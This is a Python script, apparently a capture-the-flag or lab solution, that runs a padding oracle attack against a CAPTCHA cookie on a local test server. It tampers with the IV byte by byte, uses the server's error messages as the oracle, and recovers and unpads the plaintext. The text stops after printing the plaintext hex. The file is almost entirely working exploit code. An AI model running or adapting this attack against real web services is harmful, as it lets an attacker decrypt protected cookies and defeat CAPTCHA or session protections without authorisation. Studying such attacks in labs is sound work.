import base64
import requests
import time

# Configuration - using the exact cookie from context
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Final Padding Oracle Attack")
print(f"[+] Target cookie: {target_cookie}")
print(f"[+] Cookie structure: {len(blocks)} blocks")
print(f"[+] Block 0 (IV): {blocks[0].hex()}")
print(f"[+] Block 1 (Ciphertext): {blocks[1].hex()}")

def make_request(modified_cookie):
    """Make request with modified cookie"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        data = {'username': 'testuser', 'captcha': 'test', 'submit': 'Submit'}
        resp = session.post(base_url, data=data, timeout=10)
        return resp.text, resp.status_code
    except Exception as e:
        return f"Error: {e}", -1

def decrypt_padding_oracle(iv, ciphertext):
    """
    Perform padding oracle attack to get intermediate values
    Returns the decrypted intermediate values (not final plaintext yet)
    """
    intermediate = bytearray(BLOCK_SIZE)
    original_iv = bytearray(iv)
    
    print(f"\n{'='*80}")
    print(f"[*] Starting padding oracle attack")
    print(f"{'='*80}")
    
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        expected_pad = BLOCK_SIZE - pos
        print(f"\n[+] Decrypting byte {pos:2d} (padding value: {expected_pad}) ", end="", flush=True)
        
        for guess in range(256):
            if guess % 64 == 0 and guess > 0:
                print(".", end="", flush=True)
                time.sleep(0.1)
            
            # Create modified IV
            test_iv = bytearray(original_iv)
            
            # Set known bytes with correct padding
            for i in range(pos + 1, BLOCK_SIZE):
                pad_val = expected_pad
                test_iv[i] = original_iv[i] ^ intermediate[i] ^ pad_val
            
            # Set current byte to test
            test_iv[pos] = original_iv[pos] ^ guess ^ expected_pad
            
            # Create test cookie
            test_cookie = base64.b64encode(test_iv + ciphertext).decode()
            
            # Test with server
            response, status = make_request(test_cookie)
            
            # Check for valid padding
            if "Invalid CAPTCHA!" in response or (status == 403 and len(response) < 100):
                char = chr(guess) if 32 <= guess <= 126 else '.'
                print(f"\n[+] Found byte {pos:2d} = 0x{guess:02x} '{char}'")
                intermediate[pos] = guess
                break
        else:
            print(f"\n[-] Failed at byte {pos}")
            intermediate[pos] = 0
    
    return bytes(intermediate)

# Calculate final plaintext: plaintext = intermediate XOR IV
iv = blocks[0]
ciphertext = blocks[1]

print(f"[*] Step 1: Get intermediate values via padding oracle...")
intermediate_values = decrypt_padding_oracle(iv, ciphertext)

print(f"\n{'='*80}")
print(f"[+] STEP 2: Compute final plaintext")
print(f"[+] Intermediate values: {intermediate_values.hex()}")
print(f"[+] IV:                  {iv.hex()}")
print(f"{'='*80}")

# XOR to get actual plaintext
plaintext_bytes = bytearray(BLOCK_SIZE)
for i in range(BLOCK_SIZE):
    plaintext_bytes[i] = intermediate_values[i] ^ iv[i]

print(f"[+] Raw plaintext: {plaintext_bytes.hex()}")

# Check and remove PKCS#7 padding
print(f"\n[+] PKCS#7 Padding Analysis:")
last_byte = plaintext_bytes[-1]
print(f"[+] Last byte value: {last_byte} (0x{last_byte:02x})")

if 1 <= last_byte <= BLOCK_SIZE:
    # Verify padding structure
    padding_valid = True
    for i in range(1, last_byte + 1):
        if plaintext_bytes[-i] != last_byte:
            padding_valid = False
            break
    
    if padding_valid:
        print(f"[+] ✓ Valid {last_byte}-byte padding confirmed")
        final_plaintext = plaintext_bytes[:-last_byte]
        print(f"[+] Final plaintext length: {len(final_plaintext)} bytes")
        print(f"[+] Plaintext hex: {final_plaintext.hex()}")
        
